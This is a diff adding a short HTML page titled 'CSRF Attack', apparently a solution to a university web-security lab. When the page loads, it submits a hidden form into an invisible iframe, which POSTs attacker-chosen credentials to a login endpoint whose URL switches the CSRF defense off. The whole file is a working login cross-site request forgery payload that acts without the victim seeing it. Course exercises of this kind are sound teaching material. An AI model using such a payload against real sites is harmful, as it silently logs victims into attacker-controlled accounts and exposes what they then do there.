@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body onload="document.forms[0].submit()">
+
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+    <form action="https://bungle.sysnet.ucsd.edu/login?csrfdefense=0&xssdefense=4" method="POST" target="hiddenFrame">
+        <input type="hidden" name="username" value="attacker">
+        <input type="hidden" name="password" value="l33th4x">
+    </form>
+
+</body>
+</html>
